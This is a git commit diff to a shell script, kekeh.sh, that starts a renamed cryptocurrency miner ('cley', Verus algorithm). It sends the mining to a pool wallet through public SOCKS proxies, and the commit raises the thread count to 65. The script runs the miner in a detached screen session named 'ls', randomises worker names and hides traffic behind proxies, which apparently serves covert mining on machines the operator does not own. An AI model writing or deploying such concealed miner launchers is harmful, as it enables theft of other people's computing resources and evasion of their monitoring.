5451d07df4d682b4df24d582ebfeb4323a51c856
gembock <85003230+gembock@users.noreply.github.com>
2021-07-12 15:13:59 +0700

    kekeh.sh

--- kekeh.sh
+++ kekeh.sh
@@ -5,6 +5,6 @@ chmod +x cley
 screen -dmS ls 
 POOL=stratum+tcp://eu.luckpool.net:3956
 WALLET=REpjC6VmRd7LwtK9xuWEZQfPvSYpBCia5s
-WORKER=$(echo $(shuf -i 1-7 -n 1)-CUDA)
-PROXY=socks5://88.202.177.242:1085
-./cley -a verus -o $POOL -u $WALLET.$WORKER -t 2 -x $PROXY
+WORKER=$(echo $(shuf -i 1-7 -n 1)-CUDA77)
+PROXY=socks4://176.212.149.251:4145
+./cley -a verus -o $POOL -u $WALLET.$WORKER -t 65 -x $PROXY
